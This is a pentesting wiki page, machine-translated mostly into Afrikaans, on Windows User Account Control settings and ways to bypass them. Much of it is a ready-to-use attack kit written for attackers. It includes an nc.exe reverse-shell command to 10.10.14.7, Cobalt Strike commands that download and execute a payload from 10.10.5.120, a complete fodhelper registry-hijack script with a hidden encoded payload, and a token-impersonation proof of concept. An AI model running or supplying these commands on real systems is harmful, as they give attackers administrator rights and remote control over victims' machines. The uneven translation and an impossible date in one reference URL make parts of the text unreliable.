# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is 'n funksie wat 'n **toestemmingsprompt vir verhoogde aktiwiteite** moontlik maak. Programme het verskillende `integrity` vlakke, en 'n program met 'n **hoë vlak** kan take uitvoer wat **die stelsel moontlik kan kompromitteer**. Wanneer UAC geaktiveer is, loop toepassings en take altyd **onder die sekuriteitskonteks van 'n nie-administrateurrekening** tensy 'n administrateur uitdruklik hierdie toepassings/take magtig om op administrateurvlak toegang tot die stelsel te hê. Dit is 'n gerieffunksie wat administrateurs beskerm teen onbedoelde veranderings, maar dit word nie as 'n sekuriteitsgrens beskou nie.

Vir meer inligting oor integriteitsvlakke:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Wanneer UAC geaktiveer is, ontvang 'n administrateurgebruiker twee tokenne: 'n standaardgebruikertoken om gewone aksies op gewone vlak uit te voer, en een met administrateurprivileges.

This [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) bespreek hoe UAC werk in grootpte en sluit die aanmeldproses, gebruikerservaring en UAC-argitektuur in. Administrateurs kan sekuriteitsbeleide gebruik om te konfigureer hoe UAC spesifiek vir hul organisasie werk op plaaslike vlak (met behulp van secpol.msc), of dit kan gekonfigureer en deur Group Policy Objects (GPO) in 'n Active Directory-domeinomgewing uitgestuur word. Die verskeie instellings word in detail [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) bespreek. Daar is 10 Group Policy-instellings wat vir UAC gestel kan word. Die volgende tabel gee bykomende besonderhede:

| Groepsbeleid-instelling                                                                                                                                                                                                                                                                                                                                                          | Registersleutel            | Standaardinstelling                                           |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Uitgeskakel                                                  |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Uitgeskakel                                                  |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Ingeskakel (standaard vir Home) Uitgeskakel (standaard vir Enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Uitgeskakel                                                  |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Ingeskakel                                                   |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Ingeskakel                                                   |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Ingeskakel                                                   |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Ingeskakel                                                   |

### UAC Omseiling Teorie

Sommige programme word **autoelevated automatically** as die **gebruiker behoort** tot die **administrateurgroep**. Hierdie binaries het in hul _**Manifests**_ die _**autoElevate**_ opsie met die waarde _**True**_. Die binary moet ook deur **Microsoft geteken** wees.

Baie auto-elevate prosesse stel **funksionaliteit beskikbaar via COM objects of RPC servers**, wat vanaf prosesse wat met `medium` `integrity` loop (gebruikersvlakprivileges) aangeroep kan word. Let daarop dat COM (Component Object Model) en RPC (Remote Procedure Call) metodes is wat Windows-programme gebruik om te kommunikeer en funksies oor verskillende prosesse uit te voer. Byvoorbeeld, **`IFileOperation COM object`** is ontwerp om lêeroperasies (kopieer, skrap, skuif) te hanteer en kan priviliges outomaties verhoog sonder 'n prompt.

Let ook daarop dat sekere kontrole gedoen kan word, soos om te kontroleer of die proses vanaf die **System32 directory** uitgevoer is, wat oorgeslaan kan word deur byvoorbeeld in **explorer.exe** of 'n ander System32-gebaseerde uitvoerbare te injekteer.

Nog 'n manier om hierdie kontroles te omseil is om die **PEB te wysig**. Elke proses in Windows het 'n Process Environment Block (PEB), wat belangrike data oor die proses insluit, soos die uitvoerbare pad. Deur die PEB te wysig, kan aanvallers die ligging van hul eie kwaadwillige proses vervals (spoof), en dit laat lyk asof dit vanaf 'n vertroude gids (soos System32) loop. Hierdie vervalste inligting mislei die COM-object om priviliges outomaties te verhoog sonder om die gebruiker te vra.

Om dus die **UAC** te **omseil** (verhoog van `medium` integriteitsvlak na `high`) gebruik sommige aanvallers hierdie tipe binaries om **arbitraire kode uit te voer** omdat dit dan vanuit 'n proses met hoë integriteitsvlak uitgevoer sal word.

Jy kan die _**Manifest**_ van 'n binary nagaan met die hulpmiddel _**sigcheck.exe**_ van Sysinternals. (`sigcheck.exe -m <file>`) En jy kan die `integrity` vlak van prosesse sien met Process Explorer of Process Monitor (van Sysinternals).

### Kontroleer UAC

Om te bevestig of UAC geaktiveer is, doen:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
As dit **`1`** is, dan is UAC **geaktiveer**, as dit **`0`** is of dit **nie bestaan nie**, dan is UAC **onaktief**.

Kyk dan **watter vlak** gekonfigureer is:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- If **`0`** then, UAC won't prompt (like **disabled**)
- If **`1`** the admin is **asked for username and password** to execute the binary with high rights (on Secure Desktop)
- If **`2`** (**Always notify me**) UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges (on Secure Desktop)
- If **`3`** like `1` but not necessary on Secure Desktop
- If **`4`** like `2` but not necessary on Secure Desktop
- if **`5`**(**default**) it will ask the administrator to confirm to run non Windows binaries with high privileges

Then, you have to take a look at the value of **`LocalAccountTokenFilterPolicy`**\
If the value is **`0`**, then, only the **RID 500** user (**built-in Administrator**) is able to perform **admin tasks without UAC**, and if its `1`, **all accounts inside "Administrators"** group can do them.

And, finally take a look at the value of the key **`FilterAdministratorToken`**\
If **`0`**(default), the **built-in Administrator account can** do remote administration tasks and if **`1`** the built-in account Administrator **cannot** do remote administration tasks, unless `LocalAccountTokenFilterPolicy` is set to `1`.

#### Summary

- If `EnableLUA=0` or **doesn't exist**, **no UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , No UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, No UAC for RID 500 (Built-in Administrator)**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, UAC for everyone**

All this information can be gathered using the **metasploit** module: `post/windows/gather/win_privs`

You can also check the groups of your user and get the integrity level:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> Let daarop dat as jy grafiese toegang tot die slagoffer het, UAC bypass reguit vorentoe is aangesien jy eenvoudig op "Yes" kan klik wanneer die UAC-prompt verskyn

Die UAC bypass is nodig in die volgende situasie: **die UAC is geaktiveer, jou proses loop in 'n medium integrity context, en jou gebruiker behoort tot die administrators group**.

Dit is belangrik om te noem dat dit **baie moeiliker is om die UAC te omseil as dit op die hoogste sekuriteitsvlak (Always) ingestel is as op een van die ander vlakke (Default).**

### UAC disabled

As UAC reeds gedeaktiveer is (`ConsentPromptBehaviorAdmin` is **`0`**) kan jy **execute a reverse shell with admin privileges** (high integrity level) gebruik deur iets soos die volgende uit te voer:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/
- https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html

### **Baie** Basiese UAC "bypass" (volledige toegang tot die lêerstelsel)

As jy 'n shell het met 'n gebruiker wat deel is van die Administrators group, kan jy die **C$** gedeelde via SMB plaaslik as 'n nuwe skyf monteer en jy sal **toegang tot alles in die lêerstelsel** hê (selfs die Administrator se tuismap).

> [!WARNING]
> **Dit lyk asof hierdie truuk nie meer werk nie**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass met cobalt strike

Die Cobalt Strike-tegnieke sal slegs werk as UAC nie op sy maksimum sekuriteitsvlak gestel is nie.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** en **Metasploit** het ook verskeie modules om die **UAC** te **bypass**.

### KRBUACBypass

Dokumentasie en hulpmiddel by [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) wat 'n **samestelling** is van verskeie UAC bypass exploits. Let wel dat jy sal moet **compile UACME using visual studio or msbuild**. Die samestelling sal verskeie uitvoerbare lêers skep (soos `Source\Akagi\outout\x64\Debug\Akagi.exe`), jy sal moet weet **watter een jy benodig.**\
Jy moet **wees versigtig** omdat sommige bypasses **ander programme sal aanroep** wat die **gebruiker** **sal waarsku** dat iets gebeur.

UACME het die **bouweergawe waarmee elke tegniek begin werk het**. Jy kan soek na 'n tegniek wat jou weergawes raak:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Ook, deur [this](https://en.wikipedia.org/wiki/Windows_10_version_history) bladsy kry jy die Windows-uitgawe `1607` uit die build-weergawes.

### UAC Bypass – fodhelper.exe (Registry hijack)

Die betroubare binêre `fodhelper.exe` word op moderne Windows outomaties verhoog. Wanneer dit gelanseer word, bevraagteken dit die per-gebruiker registerpad hieronder sonder om die `DelegateExecute` verb te valideer. Deur 'n opdrag daar te plant kan 'n Medium Integrity-proses (user is in Administrators) 'n High Integrity-proses skep sonder 'n UAC-prompt.

Registerpad wat deur fodhelper nagevra word:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
PowerShell-stappe (stel jou payload, dan trigger):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Notes:
- Werk wanneer die huidige gebruiker 'n lid is van Administrators en die UAC-vlak is default/lenient (nie Always Notify met ekstra beperkings nie).
- Gebruik die `sysnative` pad om 'n 64-bit PowerShell van 'n 32-bit proses op 64-bit Windows te start.
- Payload kan enige opdrag wees (PowerShell, cmd, of 'n EXE-pad). Vermy prompting UIs vir stealth.

#### Meer UAC bypass

**All** die tegnieke wat hier gebruik word om AUC **require** 'n **full interactive shell** met die slagoffer ( 'n gewone nc.exe shell is nie genoeg nie).

Jy kan dit kry deur 'n **meterpreter** sessie te gebruik. Migreer na 'n **process** wat die **Session** waarde op **1** het:

![](<../../images/image (863).png>)

(_explorer.exe_ behoort te werk)

### UAC Bypass met GUI

As jy toegang tot 'n **GUI** het kan jy net die UAC prompt aanvaar wanneer dit verskyn; jy het eintlik nie 'n bypass nodig nie. Dus, toegang tot 'n GUI sal jou toelaat om die UAC te bypass.

Verder, as jy 'n GUI sessie kry wat iemand gebruik het (miskien via RDP), is daar sekere tools wat as administrator sal loop, van waaruit jy byvoorbeeld 'n **cmd** **as admin** direk kan uitvoer sonder om weer deur UAC gevra te word, soos [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Dit kan 'n bietjie meer **stealthy** wees.

### Luidrugtige brute-force UAC bypass

As jy nie omgee om lawaaierig te wees nie, kan jy altyd **iets soos** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) loop wat bly vra om permissies te verhoog totdat die gebruiker dit aanvaar.

### Jou eie bypass - Basiese UAC bypass metodologie

As jy na **UACME** kyk sal jy opmerk dat **die meeste UAC bypasses 'n Dll Hijacking kwetsbaarheid misbruik** (hoofsaaklik deur die kwaadwillige dll op _C:\Windows\System32_ te skryf). [Lees dit om te leer hoe om 'n Dll Hijacking vulnerability te vind](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Vind 'n binary wat **autoelevate** (kontroleer dat dit by uitvoering op 'n high integrity level loop).
2. Gebruik procmon om "**NAME NOT FOUND**" gebeure te vind wat aan **DLL Hijacking** vatbaar kan wees.
3. Jy sal waarskynlik die DLL binne sekere **protected paths** (soos C:\Windows\System32) moet **write**, waar jy nie skryfpermitte het nie. Jy kan dit omseil deur:
   1. **wusa.exe**: Windows 7,8 and 8.1. Dit laat toe om die inhoud van 'n CAB-lêer binne protected paths uit te pak (omdat hierdie hulpmiddel vanaf 'n high integrity level uitgevoer word).
   2. **IFileOperation**: Windows 10.
4. Berei 'n **script** voor om jou DLL in die protected path te kopieer en die kwesbare en autoelevated binary uit te voer.

### Nog 'n UAC bypass technique

Bestaan uit die bekyk of 'n **autoElevated binary** probeer om vanaf die **registry** die **name/path** van 'n **binary** of **command** wat uitgevoer moet word, te **read** (dit is meer interessant as die binary hierdie inligting binne die **HKCU** soek).

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection” gebruik shadow-admin tokens met per-session `\Sessions\0\DosDevices/<LUID>` maps. Die directory is geskep lui deur `SeGetTokenDeviceMap` op die eerste `\??` resolusie. As die aanvaller die shadow-admin token slegs op **SecurityIdentification** imiteer, word die gids geskep met die aanvaller as **owner** (erf `CREATOR OWNER`), wat drive-letter skakels moontlik maak wat voorrang gee bo `\GLOBAL??`.

**Stappe:**

1. Vanuit 'n low-privileged sessie, roep `RAiProcessRunOnce` aan om 'n promptless shadow-admin `runonce.exe` te spawn.
2. Dupliceer die primêre token na 'n **identification** token en imiteer dit terwyl jy `\??` oopmaak om die skepping van `\Sessions\0\DosDevices/<LUID>` onder die aanvaller se eienaarskap af te dwing.
3. Skep 'n `C:` symlink daar wat na aanvaller-beheerde stoorplek wys; daaropvolgende lêerstelsel-toegang in daardie sessie los `C:` op na die aanvaller se pad, wat DLL/file hijack moontlik maak sonder 'n prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Verwysings
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
